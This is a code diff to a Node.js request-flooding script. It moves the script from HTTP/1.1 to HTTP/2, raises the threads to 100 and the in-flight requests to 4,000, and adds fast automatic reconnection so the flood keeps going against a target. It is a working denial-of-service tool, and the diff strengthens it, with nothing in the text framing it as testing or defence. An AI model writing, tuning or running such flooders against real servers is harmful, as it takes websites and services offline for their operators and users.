@@ -1,11 +1,11 @@
-const http = require('http');  // Use http module instead of http2
+const http2 = require('http2');
 const { Worker, isMainThread, workerData } = require('worker_threads');
 const readline = require('readline');
 const net = require('net');
 
-const THREADS = 22;
-const POWER_MULTIPLIER = 2;
-const MAX_INFLIGHT = 2000;
+const THREADS = 100;
+const POWER_MULTIPLIER = 1;
+const MAX_INFLIGHT = 4000;
 const LIVE_REFRESH_RATE = 100;
 
 let totalRequests = 0;
@@ -96,13 +96,9 @@ if (isMainThread) {
         if (inflight.count < MAX_INFLIGHT) {
             try {
                 inflight.count++;
-                const req = http.request({
-                    hostname: target,
-                    port: 80,  // You might need to use HTTPS with port 443 depending on your target
-                    path: '/',
-                    method: 'GET',
-                    headers: { 'Connection': 'keep-alive' },
-                }, (res) => {
+                const req = client.request({ ':method': 'GET', ':path': '/' });
+
+                req.on('response', () => {
                     inflight.count--;
                     sendStat('ok');
                 });
@@ -129,12 +125,7 @@ if (isMainThread) {
 
         let client;
         try {
-            client = http.request({
-                hostname: target,
-                port: 80,  // Assuming HTTP, use 443 for HTTPS
-                method: 'GET',
-                path: '/',
-            });
+            client = http2.connect(target);
 
             const inflight = { count: 0 };
 
@@ -143,9 +134,10 @@ if (isMainThread) {
                 setTimeout(createConnection, 5000); // auto-recover fast
             });
 
+            client.on('goaway', () => client.close());
             client.on('close', () => setTimeout(createConnection, 5000));
 
-            client.on('response', () => {
+            client.on('connect', () => {
                 for (let i = 0; i < connections; i++) sendLoop(client, inflight); // boosted request flow
             });
         } catch {
